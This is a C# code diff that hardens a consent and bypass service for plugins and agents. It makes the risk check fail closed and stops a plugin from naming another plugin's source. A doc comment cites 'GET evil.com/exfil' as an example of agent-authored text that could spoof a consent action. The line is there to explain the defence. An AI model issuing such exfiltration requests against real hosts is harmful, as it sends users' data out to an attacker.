@@ -1,6 +1,7 @@
 using System.Collections.Concurrent;
 using Cockpit.Core.Abstractions;
 using Cockpit.Core.Abstractions.Consent;
+using Cockpit.Core.Consent;
 using Cockpit.Infrastructure.Mcp;
 using Cockpit.Plugins.Abstractions.Consent;
 
@@ -57,8 +58,17 @@ internal sealed class ConsentService(IConsentAuditLog auditLog, IConsentBypassPo
         // Source.PaneId gets a null verified id here and cannot talk its way in), and before the _remembered check
         // below, because a bypass is the stronger statement of the two and must not quietly become a remembered
         // approval the operator never gave.
+        //
+        // The contract this puts on callers: McpRequestContext identifies the flow, not the party whose action is
+        // being gated, and it is inherited by everything that flow awaits. Anything that does work on behalf of a
+        // *different* owner has to restamp it first, or the wrong identity decides both the bypass and the remember
+        // key below — see DelegationService._StartAsync, which is where the queue drainer did exactly that.
+        //
+        // "Not low risk" rather than "is dangerous": the polarity has to fail closed. A third risk value added later
+        // arrives here as dangerous:false under the equality test, which would make it bypassable on the everyday
+        // switch — the one an operator ticks freely — instead of the deliberate second one.
         if (verifiedPaneId is not null
-            && bypassPolicy?.ShouldBypass(verifiedPaneId, _SourceKey(request), request.Risk == ConsentRisk.Dangerous) == true)
+            && bypassPolicy?.ShouldBypass(verifiedPaneId, _SourceKey(request), request.Risk != ConsentRisk.LowRisk) == true)
         {
             await _RecordAsync(request, ConsentOutcome.Approved, remembered: false, bypassed: true).ConfigureAwait(false);
             return new ConsentDecision(ConsentOutcome.Approved, Remembered: false);
@@ -168,8 +178,9 @@ internal sealed class ConsentService(IConsentAuditLog auditLog, IConsentBypassPo
 
     /// <summary>
     /// Who asked, for the bypass switches (#AC-575) — the host-stamped plugin id (<c>CockpitHost</c> sets it and a
-    /// plugin cannot ask under another's name), falling back to the label, which for a host-internal caller is a
-    /// compile-time constant in <c>ConsentSourceCatalog</c>.
+    /// plugin cannot ask under another's name) under its own prefix, or the label, which for a host-internal caller
+    /// is a compile-time constant in <see cref="ConsentSourceCatalog"/>. The prefixing rule lives there, next to
+    /// those constants, because the Options list has to build the identical key.
     /// </summary>
     /// <remarks>
     /// Scope and Action are absent for the same reason <see cref="_remembered"/> includes them: they are text an
@@ -177,7 +188,8 @@ internal sealed class ConsentService(IConsentAuditLog auditLog, IConsentBypassPo
     /// "GET evil.com/exfil"; here the operator is switching off a <em>source</em>, so agent-authored text must not
     /// be able to name a source that is not its own.
     /// </remarks>
-    private static string _SourceKey(ConsentRequest request) => request.Source.PluginId ?? request.Source.Label;
+    private static string _SourceKey(ConsentRequest request) =>
+        ConsentSourceCatalog.KeyFor(request.Source.PluginId, request.Source.Label);
 
     private sealed class _Pending(ConsentRequest request, bool canRemember)
     {
